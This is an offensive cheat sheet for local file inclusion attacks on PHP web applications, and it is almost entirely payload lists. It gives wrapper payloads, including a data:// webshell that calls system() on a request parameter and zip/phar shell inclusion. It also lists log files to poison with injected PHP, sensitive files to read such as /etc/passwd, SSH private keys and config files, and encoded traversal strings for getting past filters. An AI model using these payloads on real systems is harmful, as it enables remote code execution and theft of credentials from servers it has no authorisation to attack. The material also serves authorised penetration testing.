# LFI Techniques and Escalation Paths

## Wrapper Techniques

```text
php://filter/convert.base64-encode/resource=index.php
php://input
data://text/plain,<?php system($_GET['cmd']); ?>
expect://id
zip://shell.jpg%23shell.php
phar://archive.jpg/test.txt
```

## Log Poisoning Targets

```text
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/secure
```

Inject PHP into logs via User-Agent or request path, then include the log file.

## Useful Linux Reads

```text
/etc/passwd
/etc/hosts
/etc/issue
/proc/self/environ
/proc/self/cmdline
/proc/version
/home/<user>/.ssh/id_rsa
/var/www/html/config.php
```

## Bypass Variants

```text
..%2f..%2f..%2fetc%2fpasswd
....//....//etc/passwd
..;/..;/..;/etc/passwd
..%252f..%252f..%252fetc%252fpasswd
```
